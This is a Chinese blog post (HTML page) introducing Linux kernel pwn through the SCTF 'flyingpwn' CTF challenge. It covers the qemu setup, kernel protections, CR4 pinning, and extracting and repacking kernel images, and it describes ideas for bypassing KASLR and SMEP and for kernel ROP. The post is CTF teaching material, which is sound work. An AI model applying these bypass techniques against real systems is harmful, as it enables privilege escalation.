<!DOCTYPE html>












  


<html class="theme-next pisces use-motion" lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">












<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">






















<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">


  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">









<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '6.3.0',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="Kernel Pwn &amp;amp;&amp;amp; SCTF flyingpwn  WP周末做了下SCTF的flyingpwn，顺带把kernelpwn总结一下 下面介绍知识的时候都以flyingpwn为例 基础知识一般题目会给下面几个文件  boot.sh是qemu的启动脚本 12345678910qemu-system-x86_64 \    -m 128M \    -kernel ~/sctf/b">
<meta property="og:type" content="article">
<meta property="og:title" content="Kernel Pwn &amp;&amp; SCTF flyingpwn  WP">
<meta property="og:url" content="http://yoursite.com/2021/12/29/KernelPwn/index.html">
<meta property="og:site_name" content="zzrR0">
<meta property="og:description" content="Kernel Pwn &amp;amp;&amp;amp; SCTF flyingpwn  WP周末做了下SCTF的flyingpwn，顺带把kernelpwn总结一下 下面介绍知识的时候都以flyingpwn为例 基础知识一般题目会给下面几个文件  boot.sh是qemu的启动脚本 12345678910qemu-system-x86_64 \    -m 128M \    -kernel ~/sctf/b">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="http://yoursite.com/2021/12/29/KernelPwn/image-20211229103229125.png">
<meta property="og:image" content="http://yoursite.com/2021/12/29/KernelPwn/image-20211229115149413.png">
<meta property="og:image" content="http://yoursite.com/2021/12/29/KernelPwn/image-20211229115227639.png">
<meta property="og:image" content="http://yoursite.com/2021/12/29/KernelPwn/image-20211229115510775.png">
<meta property="og:image" content="http://yoursite.com/2021/12/29/KernelPwn/image-20211229192830014.png">
<meta property="og:image" content="http://yoursite.com/2021/12/29/KernelPwn/image-20211229180919038.png">
<meta property="og:image" content="http://yoursite.com/2021/12/29/KernelPwn/image-20211229181001609.png">
<meta property="og:image" content="http://yoursite.com/2021/12/29/KernelPwn/image-20211229181116346.png">
<meta property="og:image" content="http://yoursite.com/2021/12/29/KernelPwn/image-20211229181454098.png">
<meta property="og:image" content="http://yoursite.com/2021/12/29/KernelPwn/image-20211229184006282.png">
<meta property="og:image" content="http://yoursite.com/2021/12/29/KernelPwn/image-20211229184023836.png">
<meta property="og:image" content="http://yoursite.com/2021/12/29/KernelPwn/image-20211229184751883.png">
<meta property="og:image" content="http://yoursite.com/2021/12/29/KernelPwn/image-20211229184948343.png">
<meta property="og:image" content="http://yoursite.com/2021/12/29/KernelPwn/image-20211229185246441.png">
<meta property="og:image" content="http://yoursite.com/2021/12/29/KernelPwn/image-20211229185627569.png">
<meta property="og:image" content="http://yoursite.com/2021/12/29/KernelPwn/image-20211229190828951.png">
<meta property="og:updated_time" content="2021-12-29T14:25:49.222Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Kernel Pwn &amp;&amp; SCTF flyingpwn  WP">
<meta name="twitter:description" content="Kernel Pwn &amp;amp;&amp;amp; SCTF flyingpwn  WP周末做了下SCTF的flyingpwn，顺带把kernelpwn总结一下 下面介绍知识的时候都以flyingpwn为例 基础知识一般题目会给下面几个文件  boot.sh是qemu的启动脚本 12345678910qemu-system-x86_64 \    -m 128M \    -kernel ~/sctf/b">
<meta name="twitter:image" content="http://yoursite.com/2021/12/29/KernelPwn/image-20211229103229125.png">






  <link rel="canonical" href="http://yoursite.com/2021/12/29/KernelPwn/">



<script type="text/javascript" id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>Kernel Pwn && SCTF flyingpwn  WP | zzrR0</title>
  









  <noscript>
  <style type="text/css">
    .use-motion .motion-element,
    .use-motion .brand,
    .use-motion .menu-item,
    .sidebar-inner,
    .use-motion .post-block,
    .use-motion .pagination,
    .use-motion .comments,
    .use-motion .post-header,
    .use-motion .post-body,
    .use-motion .collection-title { opacity: initial; }

    .use-motion .logo,
    .use-motion .site-title,
    .use-motion .site-subtitle {
      opacity: initial;
      top: initial;
    }

    .use-motion {
      .logo-line-before i { left: initial; }
      .logo-line-after i { right: initial; }
    }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">zzrR0</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="切换导航栏">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">
    <a href="/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-about">
    <a href="/about/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">
    <a href="/tags/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">
    <a href="/categories/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">
    <a href="/archives/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
  </li>

      
      
    </ul>
  

  

  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/12/29/KernelPwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="zzrR0">
      <meta itemprop="description" content="Why am i so cai.">
      <meta itemprop="image" content="/images/head.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="zzrR0">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Kernel Pwn && SCTF flyingpwn  WP
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2021-12-29 10:27:55 / 修改时间：22:25:49" itemprop="dateCreated datePublished" datetime="2021-12-29T10:27:55+08:00">2021-12-29</time>
            

            
              

              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2021/12/29/KernelPwn/#comments" itemprop="discussionUrl">
                
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2021/12/29/KernelPwn/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2021/12/29/KernelPwn/" class="leancloud_visitors" data-flag-title="Kernel Pwn && SCTF flyingpwn  WP">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数：</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          
            <span class="post-meta-divider">|</span>
            <span class="post-meta-item-icon">
            <i class="fa fa-eye"></i>
             阅读次数： 
            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
            </span>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="Kernel-Pwn-amp-amp-SCTF-flyingpwn-WP"><a href="#Kernel-Pwn-amp-amp-SCTF-flyingpwn-WP" class="headerlink" title="Kernel Pwn &amp;&amp; SCTF flyingpwn  WP"></a>Kernel Pwn &amp;&amp; SCTF flyingpwn  WP</h1><p>周末做了下SCTF的flyingpwn，顺带把kernelpwn总结一下</p>
<p>下面介绍知识的时候都以flyingpwn为例</p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>一般题目会给下面几个文件</p>
<p><img src="/2021/12/29/KernelPwn/image-20211229103229125.png" alt="image-20211229103229125"></p>
<p>boot.sh是qemu的启动脚本</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 128M \</span><br><span class="line">    -kernel ~/sctf/bzImage \</span><br><span class="line">    -initrd  ~/sctf/rootfs.img \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -append "root=/dev/ram console=ttyS0 oops=panic panic=1 nosmap" \</span><br><span class="line">    -cpu kvm64,+smep \</span><br><span class="line">    -smp cores=2,threads=2 \</span><br><span class="line">    -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure>
<h3 id="Kernel-保护机制"><a href="#Kernel-保护机制" class="headerlink" title="Kernel 保护机制"></a>Kernel 保护机制</h3><p>boot.sh中主要关注的就是开了哪些kernel保护机制</p>
<blockquote>
<ul>
<li><a href="http://www.phrack.org/issues/49/14.html#article" target="_blank" rel="noopener">Kernel stack cookies (or canaries)</a> - this is exactly the same as stack canaries on userland. It is enabled in the kernel at compile time and cannot be disabled.</li>
<li><a href="https://lwn.net/Articles/569635/" target="_blank" rel="noopener">Kernel address space layout randomization (KASLR)</a> - also like <code>ASLR</code> on userland, it randomizes the base address where the kernel is loaded each time the system is booted. It can be enabled/disabled by adding <code>kaslr</code> or <code>nokaslr</code> under <code>-append</code> option.</li>
<li><a href="https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf" target="_blank" rel="noopener">Supervisor mode execution protection (SMEP)</a> - this feature marks all the userland pages in the page table as non-executable when the process is in kernel-mode. In the kernel, this is enabled by setting the <code>20th bit</code> of Control Register <code>CR4</code>. On boot, it can be enabled by adding <code>+smep</code> to <code>-cpu</code>, and disabled by adding <code>nosmep</code> to <code>-append</code>.</li>
<li><a href="https://lwn.net/Articles/517475/" target="_blank" rel="noopener">Supervisor Mode Access Prevention (SMAP)</a> - complementing <code>SMEP</code>, this feature marks all the userland pages in the page table as non-accessible when the process is in kernel-mode, which means they cannot be read or written as well. In the kernel, this is enabled by setting the <code>21st bit</code> of Control Register <code>CR4</code>. On boot, it can be enabled by adding <code>+smap</code> to <code>-cpu</code>, and disabled by adding <code>nosmap</code> to <code>-append</code>.</li>
<li><a href="https://lwn.net/Articles/741878/" target="_blank" rel="noopener">Kernel page-table isolation (KPTI)</a> - when this feature is active, the kernel separates user-space and kernel-space page tables entirely, instead of using just one set of page tables that contains both user-space and kernel-space addresses. One set of page tables includes both kernel-space and user-space addresses same as before, but it is only used when the system is running in kernel mode. The second set of page tables for use in user mode contains a copy of user-space and a <em>minimal set of kernel-space addresses</em>. It can be enabled/disabled by adding <code>kpti=1</code> or <code>nopti</code> under <code>-append</code> option.</li>
</ul>
</blockquote>
<h4 id="KASLR"><a href="#KASLR" class="headerlink" title="KASLR"></a>KASLR</h4><p>这里虽然明确是说开启了smep，而没有开smap，kaslr没说，但是默认是开启的，所以这里kernel base会随机化，对此我们需要想办法leak，不过有些题确实有爆破的打法，开了KASLR后kernelbase有512个可能的加载地址，我们需要用默认的基地址0xffffffff81000000去不停的打。</p>
<p>不过我们调试的时候为了方便，可以在这里手动加上nokaslr来关闭随机化</p>
<h4 id="SMEP和SMAP"><a href="#SMEP和SMAP" class="headerlink" title="SMEP和SMAP"></a>SMEP和SMAP</h4><p>关于SMEP和SMAP的区别，一个是不可执行Execute，一个是不可Access，开了SMAP限制就比较严格，如果只开了SMEP，虽然我们不可以直接去执行用户空间的代码，但是我们依然可以访问用户空间内存，比较常见的利用思路是栈迁移到用户空间，然后打kernel ROP。</p>
<p>另外SMEP是受CR4的第20bit控制的，kernel中有一个函数是native_write_CR4(),其内部会执行mov cr4,rdi,只要我们设置rdi来清空cr4的第20bit就可以关闭SMEP</p>
<p>但是遗憾的是，在新版本的kernel中，CR4已经被锁死了</p>
<p><code></code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">native_write_cr4</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> bits_changed = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">set_register:</span><br><span class="line">	<span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">"mov %0,%%cr4"</span>: <span class="string">"+r"</span> (val) : : <span class="string">"memory"</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (static_branch_likely(&amp;cr_pinning)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (unlikely((val &amp; cr4_pinned_mask) != cr4_pinned_bits)) &#123;</span><br><span class="line">			bits_changed = (val &amp; cr4_pinned_mask) ^ cr4_pinned_bits;</span><br><span class="line">			val = (val &amp; ~cr4_pinned_mask) | cr4_pinned_bits;</span><br><span class="line">			<span class="keyword">goto</span> set_register;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">/* Warn after we've corrected the changed bits. */</span></span><br><span class="line">		WARN_ONCE(bits_changed, <span class="string">"pinned CR4 bits changed: 0x%lx!?\n"</span>,</span><br><span class="line">			  bits_changed);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; pinned CR4 bits changed: 0x100000!?</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>如果修改CR4，在Kernel log中就会打印上面这个错误，所以利用思路只剩内核ROP。</p>
<h3 id="kernel-crash"><a href="#kernel-crash" class="headerlink" title="kernel crash"></a>kernel crash</h3><p>这个是我在搜索信息的时候发现的不起眼的选项</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oops=panic panic=1</span><br></pre></td></tr></table></figure>
<p>这个选项其实非常关键</p>
<p>当内核发生crash时，会提示这样的信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&lt;ffffffffc011b47d&gt;] ? do_ioctl+0x34d/0x4c0 [vuln_driver]</span><br></pre></td></tr></table></figure>
<p>我们可以借此计算kernelbase，要利用这个方法，我们必须得保证crash时，内核不会重启，而这句的意思就是将oops类型的错误当作panic错误处理，而panic会使得1s后重启内核，所以这句可以限制kaslr的利用</p>
<h3 id="core-and-thread"><a href="#core-and-thread" class="headerlink" title="core and thread"></a>core and thread</h3><p>在boot.sh中指定了是两核两线程，多核这个会影响到内核slab的分配，在一个CPU上运行的进程是共享slab池的，不同的CPU上的进程不共享slab，因此有时为了避免这个影响，我们得手动设置下亲和性</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set_thread_aff(0)</span><br></pre></td></tr></table></figure>
<h3 id="Kernel-extract"><a href="#Kernel-extract" class="headerlink" title="Kernel extract"></a>Kernel extract</h3><p>bzImage是内核镜像的压缩格式文件，解压脚本如下,用法为</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./extract-image.sh ./vmlinuz &gt; vmlinux</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># SPDX-License-Identifier: GPL-2.0-only</span></span><br><span class="line"><span class="comment"># ----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># extract-vmlinux - Extract uncompressed vmlinux from a kernel image</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Inspired from extract-ikconfig</span></span><br><span class="line"><span class="comment"># (c) 2009,2010 Dick Streefland &lt;dick@streefland.net&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># (c) 2011      Corentin Chary &lt;corentin.chary@gmail.com&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># ----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">check_vmlinux()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment"># Use readelf to check if it's a valid ELF</span></span><br><span class="line">	<span class="comment"># <span class="doctag">TODO:</span> find a better to way to check that it's really vmlinux</span></span><br><span class="line">	<span class="comment">#       and not just an elf</span></span><br><span class="line">	readelf -h <span class="variable">$1</span> &gt; /dev/null 2&gt;&amp;1 || <span class="built_in">return</span> 1</span><br><span class="line"></span><br><span class="line">	cat <span class="variable">$1</span></span><br><span class="line">	<span class="built_in">exit</span> 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try_decompress()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment"># The obscure use of the "tr" filter is to work around older versions of</span></span><br><span class="line">	<span class="comment"># "grep" that report the byte offset of the line instead of the pattern.</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># Try to find the header ($1) and decompress from here</span></span><br><span class="line">	<span class="keyword">for</span>	pos <span class="keyword">in</span> `tr <span class="string">"<span class="variable">$1</span>\n<span class="variable">$2</span>"</span> <span class="string">"\n<span class="variable">$2</span>="</span> &lt; <span class="string">"<span class="variable">$img</span>"</span> | grep -abo <span class="string">"^<span class="variable">$2</span>"</span>`</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">		pos=<span class="variable">$&#123;pos%%:*&#125;</span></span><br><span class="line">		tail -c+<span class="variable">$pos</span> <span class="string">"<span class="variable">$img</span>"</span> | <span class="variable">$3</span> &gt; <span class="variable">$tmp</span> 2&gt; /dev/null</span><br><span class="line">		check_vmlinux <span class="variable">$tmp</span></span><br><span class="line">	<span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check invocation:</span></span><br><span class="line">me=<span class="variable">$&#123;0##*/&#125;</span></span><br><span class="line">img=<span class="variable">$1</span></span><br><span class="line"><span class="keyword">if</span>	[ <span class="variable">$#</span> -ne 1 -o ! -s <span class="string">"<span class="variable">$img</span>"</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"Usage: <span class="variable">$me</span> &lt;kernel-image&gt;"</span> &gt;&amp;2</span><br><span class="line">	<span class="built_in">exit</span> 2</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Prepare temp files:</span></span><br><span class="line">tmp=$(mktemp /tmp/vmlinux-XXX)</span><br><span class="line"><span class="built_in">trap</span> <span class="string">"rm -f <span class="variable">$tmp</span>"</span> 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># That didn't work, so retry after decompression.</span></span><br><span class="line">try_decompress <span class="string">'\037\213\010'</span> xy    gunzip</span><br><span class="line">try_decompress <span class="string">'\3757zXZ\000'</span> abcde unxz</span><br><span class="line">try_decompress <span class="string">'BZh'</span>          xy    bunzip2</span><br><span class="line">try_decompress <span class="string">'\135\0\0\0'</span>   xxx   unlzma</span><br><span class="line">try_decompress <span class="string">'\211\114\132'</span> xy    <span class="string">'lzop -d'</span></span><br><span class="line">try_decompress <span class="string">'\002!L\030'</span>   xxx   <span class="string">'lz4 -d'</span></span><br><span class="line">try_decompress <span class="string">'(\265/\375'</span>   xxx   unzstd</span><br><span class="line"></span><br><span class="line"><span class="comment"># Finally check for uncompressed images or objects:</span></span><br><span class="line">check_vmlinux <span class="variable">$img</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Bail out:</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$me</span>: Cannot find vmlinux."</span> &gt;&amp;2</span><br></pre></td></tr></table></figure>
<p>提取出vmlinux之后，直接用ROPGadget获得可用gadgets备用</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ROPgadget --binary ./vmlinux &gt; gadgets.txt</span></span><br></pre></td></tr></table></figure>
<h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><p>提取文件系统直接用binwalk就行，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me rootfs.img</span><br></pre></td></tr></table></figure>
<p>另一个常用的操作是重打包文件系统，因为我们一般要修改init文件和放exp程序进去</p>
<p>重打包脚本如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find . -print0 \</span><br><span class="line">| cpio --null -ov --format=newc \</span><br><span class="line">| gzip -9 &gt; <span class="variable">$1</span></span><br></pre></td></tr></table></figure>
<p>将该脚本放到rootfs根目录下，运行下面命令，即可在上层目录生成重打包的文件系统 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh cpio.sh ../rootfs.cpio</span><br></pre></td></tr></table></figure>
<p>在文件系统中，一般能够找到题目驱动，比如flying.ko,我们一般还要关注init文件，这个文件是系统的启动文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mkdir tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"Boot took <span class="variable">$(cut -d' ' -f1 /proc/uptime)</span> seconds"</span></span><br><span class="line"></span><br><span class="line">insmod /flying.ko</span><br><span class="line">chmod 666 /dev/seven</span><br><span class="line">chmod 740 /flag</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">chmod 400 /proc/kallsyms</span><br><span class="line"></span><br><span class="line">poweroff -d 240 -f &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">umount /tmp</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<p>比较关键的几句是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">poweroff -d 240 -f &amp;</span><br><span class="line">``` </span><br><span class="line">这句会设置定时关机，所以我们直接删掉</span><br></pre></td></tr></table></figure>
<p>echo 1 &gt; /proc/sys/kernel/kptr_restrict<br>echo 1 &gt; /proc/sys/kernel/dmesg_restrict<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">这两句设置dmesg限制，当我们为非root用户时是看不到kernel debug message的，我们也没法调用dmesg命令</span><br><span class="line"></span><br><span class="line">为了调试方便，我们一般都设置成0，但是注意这里的限制不影响printk，像题目中使用printk打印信息我们还是能看到的(做题的时候以为看不到，导致思路朝盲pwn上想浪费了大量时间)</span><br><span class="line"></span><br><span class="line">![image-20211229113232699](.\image-20211229113232699.png)</span><br></pre></td></tr></table></figure></p>
